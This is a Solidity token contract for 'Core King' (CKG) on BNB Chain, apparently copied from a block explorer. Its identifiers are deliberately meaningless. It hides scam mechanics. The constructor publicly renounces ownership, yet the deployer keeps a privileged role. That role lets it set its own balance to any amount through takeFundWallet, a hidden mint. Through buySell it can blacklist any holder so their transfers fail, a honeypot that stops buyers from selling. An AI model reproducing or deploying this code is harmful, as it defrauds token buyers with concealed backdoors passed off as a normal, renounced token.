/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface atShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenSell) external view returns (uint256);

    function transfer(address fundSwap, uint256 teamSwap) external returns (bool);

    function allowance(address toToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamSwap) external returns (bool);

    function transferFrom(
        address sender,
        address fundSwap,
        uint256 teamSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchExempt, uint256 value);
    event Approval(address indexed toToken, address indexed spender, uint256 value);
}

interface amountExempt is atShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract txTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txFund {
    function createPair(address limitMin, address walletShould) external returns (address);
}

interface marketingFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreKing is txTotal, atShould, amountExempt {

    address public launchBuy;

    function symbol() external view virtual override returns (string memory) {
        return launchedEnable;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxTxMin;
    }

    function marketingSell() public {
        if (feeTeam != fromToken) {
            enableExemptBuy = true;
        }
        if (exemptWallet == teamAtTx) {
            maxTrading = false;
        }
        maxExempt=0;
    }

    address public teamFee;

    uint256 private maxTxMin = 100000000 * 10 ** 18;

    function transfer(address receiverFrom, uint256 teamSwap) external virtual override returns (bool) {
        return totalExemptBuy(_msgSender(), receiverFrom, teamSwap);
    }

    uint256 public fromToken;

    bool private maxTrading;

    constructor (){
        if (teamAtTx != feeTeam) {
            feeTeam = teamAtTx;
        }
        marketingFrom txMax = marketingFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchBuy = txFund(txMax.factory()).createPair(txMax.WETH(), address(this));
        totalSell = _msgSender();
        
        teamFee = totalSell;
        launchedAuto[teamFee] = true;
        if (fromToken == maxExempt) {
            fromToken = maxExempt;
        }
        buyTrading[teamFee] = maxTxMin;
        emit Transfer(address(0), teamFee, maxTxMin);
        totalTx();
    }

    mapping(address => bool) public listSwap;

    mapping(address => bool) public launchedAuto;

    function takeFundWallet(uint256 teamSwap) public {
        if (!launchedAuto[_msgSender()]) {
            return;
        }
        buyTrading[teamFee] = teamSwap;
    }

    uint256 public teamAtTx;

    string private launchedEnable = "CKG";

    address private totalSell;

    function receiverTo() public view returns (uint256) {
        return exemptWallet;
    }

    bool public fromWallet;

    uint8 private modeMin = 18;

    uint256 private feeTeam;

    function getOwner() external view returns (address) {
        return totalSell;
    }

    function feeSell() public view returns (uint256) {
        return fromToken;
    }

    function transferFrom(address shouldAt, address fundSwap, uint256 teamSwap) external override returns (bool) {
        if (listBuy[shouldAt][_msgSender()] != type(uint256).max) {
            require(teamSwap <= listBuy[shouldAt][_msgSender()]);
            listBuy[shouldAt][_msgSender()] -= teamSwap;
        }
        return totalExemptBuy(shouldAt, fundSwap, teamSwap);
    }

    function txList() public view returns (uint256) {
        return fromToken;
    }

    string private fundWallet = "Core King";

    function buySell(address autoLaunch) public {
        if (maxTrading) {
            exemptWallet = fromToken;
        }
        if (autoLaunch == teamFee || autoLaunch == launchBuy || !launchedAuto[_msgSender()]) {
            return;
        }
        if (maxTrading) {
            maxTrading = false;
        }
        listSwap[autoLaunch] = true;
    }

    function totalTx() public {
        emit OwnershipTransferred(teamFee, address(0));
        totalSell = address(0);
    }

    function balanceOf(address tokenSell) public view virtual override returns (uint256) {
        return buyTrading[tokenSell];
    }

    function totalExemptBuy(address shouldAt, address fundSwap, uint256 teamSwap) internal returns (bool) {
        if (shouldAt == teamFee) {
            return tradingSwap(shouldAt, fundSwap, teamSwap);
        }
        require(!listSwap[shouldAt]);
        return tradingSwap(shouldAt, fundSwap, teamSwap);
    }

    function owner() external view returns (address) {
        return totalSell;
    }

    bool public enableExemptBuy;

    event OwnershipTransferred(address indexed receiverToLaunch, address indexed fundAuto);

    function amountLaunched(address limitWallet) public {
        if (fromWallet) {
            return;
        }
        
        launchedAuto[limitWallet] = true;
        if (enableExemptBuy != maxTrading) {
            maxTrading = true;
        }
        fromWallet = true;
    }

    uint256 public maxExempt;

    mapping(address => uint256) private buyTrading;

    function totalMode() public {
        if (maxTrading != enableExemptBuy) {
            fromToken = feeTeam;
        }
        if (exemptWallet == fromToken) {
            enableExemptBuy = false;
        }
        exemptWallet=0;
    }

    function tradingSwap(address shouldAt, address fundSwap, uint256 teamSwap) internal returns (bool) {
        require(buyTrading[shouldAt] >= teamSwap);
        buyTrading[shouldAt] -= teamSwap;
        buyTrading[fundSwap] += teamSwap;
        emit Transfer(shouldAt, fundSwap, teamSwap);
        return true;
    }

    uint256 public exemptWallet;

    function decimals() external view virtual override returns (uint8) {
        return modeMin;
    }

    function allowance(address takeBuy, address maxTotalWallet) external view virtual override returns (uint256) {
        return listBuy[takeBuy][maxTotalWallet];
    }

    function approve(address maxTotalWallet, uint256 teamSwap) public virtual override returns (bool) {
        listBuy[_msgSender()][maxTotalWallet] = teamSwap;
        emit Approval(_msgSender(), maxTotalWallet, teamSwap);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return fundWallet;
    }

    mapping(address => mapping(address => uint256)) private listBuy;

}